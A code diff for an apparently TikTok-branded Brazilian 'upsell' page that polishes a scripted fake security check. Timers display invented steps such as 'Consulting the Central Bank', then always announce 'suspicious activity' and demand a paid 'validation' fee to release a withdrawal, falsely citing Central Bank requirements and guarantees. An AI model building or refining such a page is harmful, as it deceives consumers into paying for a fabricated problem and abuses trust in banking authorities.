@@ -1,6 +1,6 @@
 import { useEffect, useState } from "react";
 import { useNavigate } from "react-router-dom";
-import { Search, AlertTriangle, Lock, Shield, Check, CreditCard, Clock } from "lucide-react";
+import { Search, AlertTriangle, Lock, Shield, Check, CreditCard, Clock, Fingerprint, Database, Globe, ServerCog } from "lucide-react";
 import tiktokLogo from "@/assets/tiktok-logo.png";
 import { trackTikTokEvent } from "@/lib/tiktok-tracking";
 
@@ -12,15 +12,16 @@ const UPSELL2_TAX = 21.90;
 type Screen = "verification" | "problem" | "main";
 
 const verificationSteps = [
-  "Verificando dados da conta",
-  "Validando informações pessoais",
-  "Conectando com sistema bancário",
-  "Consultando Banco Central",
+  { text: "Verificando dados da conta", icon: Search },
+  { text: "Validando informações pessoais", icon: Fingerprint },
+  { text: "Conectando com sistema bancário", icon: Database },
+  { text: "Consultando Banco Central", icon: Globe },
 ];
 
 const Upsell2 = () => {
   const [screen, setScreen] = useState<Screen>("verification");
   const [visibleSteps, setVisibleSteps] = useState(0);
+  const [progress, setProgress] = useState(0);
   const [countdown, setCountdown] = useState(4 * 60);
   const [visible, setVisible] = useState(false);
   const navigate = useNavigate();
@@ -28,10 +29,24 @@ const Upsell2 = () => {
   useEffect(() => {
     trackTikTokEvent({ event: "ViewContent", properties: { page: "upsell2", content_type: "security_validation" } });
 
+    // Smooth progress increments
+    const progressInterval = setInterval(() => {
+      setProgress(prev => {
+        if (prev >= 95) return prev;
+        return prev + 1.4;
+      });
+    }, 100);
+
     const timers = verificationSteps.map((_, i) =>
       setTimeout(() => setVisibleSteps(i + 1), 1500 * (i + 1))
     );
-    const problemTimer = setTimeout(() => setScreen("problem"), 7500);
+
+    const problemTimer = setTimeout(() => {
+      clearInterval(progressInterval);
+      setProgress(100);
+      setScreen("problem");
+    }, 7500);
+
     const mainTimer = setTimeout(() => {
       setScreen("main");
       requestAnimationFrame(() => setVisible(true));
@@ -41,6 +56,7 @@ const Upsell2 = () => {
       timers.forEach(clearTimeout);
       clearTimeout(problemTimer);
       clearTimeout(mainTimer);
+      clearInterval(progressInterval);
     };
   }, []);
 
@@ -60,10 +76,10 @@ const Upsell2 = () => {
     navigate("/pagamento");
   };
 
-  const fadeUp = (delay: number) => ({
+  const fadeUp = (delay: number): React.CSSProperties => ({
     opacity: visible ? 1 : 0,
-    transform: visible ? "translateY(0)" : "translateY(18px)",
-    transition: `opacity 0.5s ease ${delay}s, transform 0.5s ease ${delay}s`,
+    transform: visible ? "translateY(0)" : "translateY(20px)",
+    transition: `opacity 0.6s cubic-bezier(0.16,1,0.3,1) ${delay}s, transform 0.6s cubic-bezier(0.16,1,0.3,1) ${delay}s`,
   });
 
   return (
@@ -81,75 +97,164 @@ const Upsell2 = () => {
 
       <div style={{ maxWidth: 449, margin: "0 auto", width: "100%", flex: 1, padding: "0 12px" }}>
 
-        {/* ─── Tela 1: Verificação ─── */}
+        {/* ─── Tela 1: Verificação Profissional ─── */}
         {screen === "verification" && (
-          <div style={{ padding: "60px 12px", textAlign: "center", minHeight: "70vh", display: "flex", flexDirection: "column", justifyContent: "center", alignItems: "center" }}>
+          <div style={{ padding: "40px 0", minHeight: "75vh", display: "flex", flexDirection: "column", justifyContent: "center", alignItems: "center" }}>
+            {/* Card container */}
             <div style={{
-              width: 72, height: 72,
-              background: GREEN,
-              borderRadius: "50%",
-              display: "flex", alignItems: "center", justifyContent: "center",
-              margin: "0 auto 24px",
-              boxShadow: `0 4px 24px rgba(16,185,129,0.3), 0 0 0 8px rgba(16,185,129,0.08)`,
-              animation: "pulse 2s infinite",
+              background: "#fff", borderRadius: 20, padding: "36px 24px 28px",
+              boxShadow: "0 4px 32px rgba(0,0,0,0.08), 0 1px 4px rgba(0,0,0,0.04)",
+              width: "100%", maxWidth: 380, textAlign: "center",
+              animation: "slideUp 0.6s cubic-bezier(0.16,1,0.3,1)",
             }}>
-              <Search size={28} color="#fff" />
-            </div>
+              {/* Animated scanner icon */}
+              <div style={{
+                width: 72, height: 72,
+                background: `linear-gradient(135deg, ${GREEN}, #34D399)`,
+                borderRadius: 18,
+                display: "flex", alignItems: "center", justifyContent: "center",
+                margin: "0 auto 20px",
+                boxShadow: `0 6px 24px rgba(16,185,129,0.25)`,
+                animation: "iconFloat 3s ease-in-out infinite",
+                position: "relative" as const,
+              }}>
+                <ServerCog size={30} color="#fff" style={{ animation: "spinSlow 4s linear infinite" }} />
+                {/* Orbiting ring */}
+                <div style={{
+                  position: "absolute", inset: -6,
+                  border: `2px solid rgba(16,185,129,0.15)`,
+                  borderRadius: 22,
+                  animation: "ringPulse 2s ease-in-out infinite",
+                }} />
+              </div>
 
-            <p style={{ fontSize: 15, color: "#666", fontWeight: 500, marginBottom: 8 }}>
-              Verificando segurança da transação
-            </p>
-
-            <div style={{ display: "flex", justifyContent: "center", gap: 6, margin: "20px 0" }}>
-              {[0, 1, 2].map((i) => (
-                <div
-                  key={i}
-                  style={{
-                    width: 8, height: 8, borderRadius: "50%", background: RED,
-                    animation: `dotPulse 1.4s infinite ease-in-out`,
-                    animationDelay: `${-0.32 + i * 0.16}s`,
-                  }}
-                />
-              ))}
-            </div>
-
-            {verificationSteps.map((step, i) => (
-              <p
-                key={i}
-                style={{
-                  fontSize: 13, color: "#848286", marginBottom: 4,
-                  opacity: i < visibleSteps ? 1 : 0,
-                  transform: i < visibleSteps ? "translateY(0)" : "translateY(8px)",
-                  transition: "opacity 0.5s ease, transform 0.5s ease",
-                }}
-              >
-                ✓ {step}
+              <p style={{ fontSize: 16, color: "#000", fontWeight: 700, marginBottom: 4 }}>
+                Análise de Segurança
               </p>
-            ))}
+              <p style={{ fontSize: 12, color: "#848286", marginBottom: 24 }}>
+                Verificando integridade da transação
+              </p>
+
+              {/* Progress bar */}
+              <div style={{ width: "100%", height: 4, background: "#F1F1F3", borderRadius: 2, overflow: "hidden", marginBottom: 28 }}>
+                <div style={{
+                  width: `${Math.min(progress, 100)}%`, height: "100%",
+                  background: `linear-gradient(90deg, ${GREEN}, #34D399)`,
+                  borderRadius: 2,
+                  transition: "width 0.3s ease",
+                  boxShadow: `0 0 8px rgba(16,185,129,0.4)`,
+                }} />
+              </div>
+
+              {/* Steps */}
+              <div style={{ display: "flex", flexDirection: "column", gap: 12, textAlign: "left" }}>
+                {verificationSteps.map((step, i) => {
+                  const StepIcon = step.icon;
+                  const isActive = i < visibleSteps;
+                  const isCurrent = i === visibleSteps - 1 && visibleSteps < verificationSteps.length;
+                  return (
+                    <div
+                      key={i}
+                      style={{
+                        display: "flex", alignItems: "center", gap: 12,
+                        padding: "10px 14px", borderRadius: 10,
+                        background: isActive ? "rgba(16,185,129,0.04)" : "#FAFAFA",
+                        border: `1px solid ${isActive ? "rgba(16,185,129,0.12)" : "#F1F1F3"}`,
+                        opacity: isActive ? 1 : 0.4,
+                        transform: isActive ? "translateX(0)" : "translateX(-8px)",
+                        transition: "all 0.5s cubic-bezier(0.16,1,0.3,1)",
+                      }}
+                    >
+                      <div style={{
+                        width: 32, height: 32, borderRadius: 8,
+                        background: isActive ? GREEN : "#F1F1F3",
+                        display: "flex", alignItems: "center", justifyContent: "center",
+                        flexShrink: 0,
+                        boxShadow: isActive ? `0 2px 8px rgba(16,185,129,0.2)` : "none",
+                        transition: "all 0.5s ease",
+                      }}>
+                        {isActive ? (
+                          isCurrent ? (
+                            <StepIcon size={14} color="#fff" style={{ animation: "spinSlow 2s linear infinite" }} />
+                          ) : (
+                            <Check size={14} color="#fff" strokeWidth={3} />
+                          )
+                        ) : (
+                          <StepIcon size={14} color="#ccc" />
+                        )}
+                      </div>
+                      <div style={{ flex: 1 }}>
+                        <span style={{ fontSize: 13, fontWeight: 600, color: isActive ? "#000" : "#bbb", transition: "color 0.3s" }}>
+                          {step.text}
+                        </span>
+                      </div>
+                      {isActive && !isCurrent && (
+                        <span style={{ fontSize: 10, fontWeight: 600, color: GREEN, background: "rgba(16,185,129,0.08)", padding: "2px 8px", borderRadius: 99 }}>
+                          OK
+                        </span>
+                      )}
+                      {isCurrent && (
+                        <div style={{ display: "flex", gap: 3 }}>
+                          {[0, 1, 2].map(d => (
+                            <div key={d} style={{
+                              width: 4, height: 4, borderRadius: "50%", background: GREEN,
+                              animation: `dotBounce 1.2s infinite ease-in-out`,
+                              animationDelay: `${d * 0.15}s`,
+                            }} />
+                          ))}
+                        </div>
+                      )}
+                    </div>
+                  );
+                })}
+              </div>
+
+              <p style={{ fontSize: 10, color: "#bbb", marginTop: 20, fontWeight: 500 }}>
+                Conexão criptografada • SSL 256-bit
+              </p>
+            </div>
           </div>
         )}
 
         {/* ─── Tela 2: Problema Detectado ─── */}
         {screen === "problem" && (
-          <div style={{ padding: "60px 12px", textAlign: "center", minHeight: "70vh", display: "flex", flexDirection: "column", justifyContent: "center", alignItems: "center" }}>
+          <div style={{ padding: "40px 0", minHeight: "75vh", display: "flex", flexDirection: "column", justifyContent: "center", alignItems: "center" }}>
             <div style={{
-              width: 72, height: 72,
-              background: RED,
-              borderRadius: "50%",
-              display: "flex", alignItems: "center", justifyContent: "center",
-              margin: "0 auto 24px",
-              boxShadow: `0 4px 24px rgba(254,43,84,0.3), 0 0 0 8px rgba(254,43,84,0.08)`,
-              animation: "pulse 1.5s infinite",
+              background: "#fff", borderRadius: 20, padding: "40px 24px 32px",
+              boxShadow: "0 4px 32px rgba(0,0,0,0.08), 0 1px 4px rgba(0,0,0,0.04)",
+              width: "100%", maxWidth: 380, textAlign: "center",
+              animation: "shakeIn 0.5s cubic-bezier(0.16,1,0.3,1)",
             }}>
-              <AlertTriangle size={28} color="#fff" />
-            </div>
+              <div style={{
+                width: 72, height: 72,
+                background: RED,
+                borderRadius: "50%",
+                display: "flex", alignItems: "center", justifyContent: "center",
+                margin: "0 auto 20px",
+                boxShadow: `0 6px 28px rgba(254,43,84,0.3), 0 0 0 8px rgba(254,43,84,0.06)`,
+                animation: "alertPulse 1.5s ease-in-out infinite",
+              }}>
+                <AlertTriangle size={30} color="#fff" />
+              </div>
 
-            <p style={{ fontSize: 16, color: RED, fontWeight: 700, marginBottom: 10 }}>
-              Problema Detectado
-            </p>
-            <p style={{ fontSize: 13, color: "#666", lineHeight: 1.6, maxWidth: 300 }}>
-              Foi identificada uma atividade suspeita. É necessária uma validação adicional de segurança.
-            </p>
+              <p style={{ fontSize: 18, color: RED, fontWeight: 800, marginBottom: 8, letterSpacing: "-0.2px" }}>
+                Problema Detectado
+              </p>
+              <p style={{ fontSize: 13, color: "#666", lineHeight: 1.6, maxWidth: 280, margin: "0 auto" }}>
+                Foi identificada uma atividade suspeita na sua transação. Validação adicional necessária.
+              </p>
+
+              {/* Loading indicator */}
+              <div style={{ display: "flex", justifyContent: "center", gap: 4, marginTop: 24 }}>
+                {[0, 1, 2].map(i => (
+                  <div key={i} style={{
+                    width: 8, height: 8, borderRadius: "50%", background: RED,
+                    animation: `dotBounce 1.2s infinite ease-in-out`,
+                    animationDelay: `${i * 0.15}s`,
+                  }} />
+                ))}
+              </div>
+            </div>
           </div>
         )}
 
@@ -165,12 +270,12 @@ const Upsell2 = () => {
             }}>
               <div style={{
                 ...fadeUp(0.1),
-                width: 56, height: 56,
-                background: RED,
+                width: 56, height: 56, background: RED,
                 borderRadius: "50%",
                 display: "flex", alignItems: "center", justifyContent: "center",
                 margin: "0 auto 16px",
                 boxShadow: `0 4px 20px rgba(254,43,84,0.25), 0 0 0 6px rgba(254,43,84,0.08)`,
+                animation: "softPulse 2.5s ease-in-out infinite",
               }}>
                 <Lock size={24} color="#fff" />
               </div>
@@ -232,8 +337,9 @@ const Upsell2 = () => {
 
               {/* Benefits */}
               <div style={{ display: "flex", flexDirection: "column", gap: 10, margin: "16px 0 20px" }}>
-                {["Liberação imediata do saque", "Proteção garantida pelo BC", "Reembolso automático"].map((text) => (
+                {["Liberação imediata do saque", "Proteção garantida pelo BC", "Reembolso automático"].map((text, i) => (
                   <div key={text} style={{
+                    ...fadeUp(0.35 + i * 0.05),
                     display: "flex", alignItems: "center", gap: 10,
                     background: "#F8F9FB", padding: "10px 14px", borderRadius: 10,
                     boxShadow: "inset 0 1px 0 rgba(255,255,255,0.8), 0 1px 3px rgba(0,0,0,0.03)",
@@ -256,14 +362,14 @@ const Upsell2 = () => {
                 style={{
                   width: "100%", border: 0, borderRadius: 99,
                   padding: "17px 20px", fontSize: 15, fontWeight: 700,
-                  cursor: "pointer", color: "#fff",
-                  background: GREEN,
+                  cursor: "pointer", color: "#fff", background: GREEN,
                   display: "flex", alignItems: "center", justifyContent: "center", gap: 8,
                   boxShadow: `0 6px 24px rgba(16,185,129,0.3), 0 2px 6px rgba(16,185,129,0.15), inset 0 1px 0 rgba(255,255,255,0.15)`,
                   fontFamily: FONT, letterSpacing: "0.2px",
                   transition: "transform 0.15s ease",
+                  animation: "ctaGlowGreen 2s ease-in-out infinite",
                 }}
-                onMouseDown={e => (e.currentTarget.style.transform = "scale(0.98)")}
+                onMouseDown={e => (e.currentTarget.style.transform = "scale(0.97)")}
                 onMouseUp={e => (e.currentTarget.style.transform = "scale(1)")}
                 onMouseLeave={e => (e.currentTarget.style.transform = "scale(1)")}
               >
@@ -274,10 +380,9 @@ const Upsell2 = () => {
 
             {/* Timer + Security */}
             <div style={{
-              ...fadeUp(0.35),
+              ...fadeUp(0.5),
               background: "#fff", borderRadius: 12, padding: "14px 16px",
-              marginTop: 12,
-              boxShadow: "0 1px 12px rgba(0,0,0,0.04)",
+              marginTop: 12, boxShadow: "0 1px 12px rgba(0,0,0,0.04)",
               display: "flex", flexDirection: "column", alignItems: "center", gap: 10,
             }}>
               <div style={{ display: "flex", alignItems: "center", gap: 6, fontSize: 12, fontWeight: 500, color: "#848286" }}>
@@ -293,8 +398,7 @@ const Upsell2 = () => {
               </div>
             </div>
 
-            {/* Footer */}
-            <p style={{ ...fadeUp(0.4), textAlign: "center", fontSize: 11, color: "#aaa", marginTop: 14, lineHeight: 1.5, padding: "0 8px" }}>
+            <p style={{ ...fadeUp(0.55), textAlign: "center", fontSize: 11, color: "#aaa", marginTop: 14, lineHeight: 1.5, padding: "0 8px" }}>
               Esta validação é necessária para conclusão segura da transferência conforme exigido pelo Banco Central.
             </p>
           </div>
@@ -302,14 +406,43 @@ const Upsell2 = () => {
       </div>
 
       <style>{`
-        @keyframes pulse {
-          0% { transform: scale(1); }
-          50% { transform: scale(1.05); }
-          100% { transform: scale(1); }
+        @keyframes slideUp {
+          from { opacity: 0; transform: translateY(30px); }
+          to { opacity: 1; transform: translateY(0); }
         }
-        @keyframes dotPulse {
-          0%, 80%, 100% { transform: scale(0); opacity: 0.5; }
+        @keyframes softPulse {
+          0%, 100% { transform: scale(1); }
+          50% { transform: scale(1.06); }
+        }
+        @keyframes alertPulse {
+          0%, 100% { transform: scale(1); box-shadow: 0 6px 28px rgba(254,43,84,0.3), 0 0 0 8px rgba(254,43,84,0.06); }
+          50% { transform: scale(1.04); box-shadow: 0 8px 36px rgba(254,43,84,0.35), 0 0 0 12px rgba(254,43,84,0.04); }
+        }
+        @keyframes iconFloat {
+          0%, 100% { transform: translateY(0); }
+          50% { transform: translateY(-6px); }
+        }
+        @keyframes spinSlow {
+          from { transform: rotate(0deg); }
+          to { transform: rotate(360deg); }
+        }
+        @keyframes ringPulse {
+          0%, 100% { opacity: 0.4; transform: scale(1); }
+          50% { opacity: 0.8; transform: scale(1.08); }
+        }
+        @keyframes dotBounce {
+          0%, 80%, 100% { transform: scale(0.6); opacity: 0.4; }
           40% { transform: scale(1); opacity: 1; }
+        }
+        @keyframes shakeIn {
+          0% { opacity: 0; transform: translateX(-8px); }
+          30% { transform: translateX(6px); }
+          60% { transform: translateX(-4px); }
+          100% { opacity: 1; transform: translateX(0); }
+        }
+        @keyframes ctaGlowGreen {
+          0%, 100% { box-shadow: 0 6px 24px rgba(16,185,129,0.3), 0 2px 6px rgba(16,185,129,0.15), inset 0 1px 0 rgba(255,255,255,0.15); }
+          50% { box-shadow: 0 8px 32px rgba(16,185,129,0.4), 0 4px 12px rgba(16,185,129,0.2), inset 0 1px 0 rgba(255,255,255,0.15); }
         }
       `}</style>
     </div>
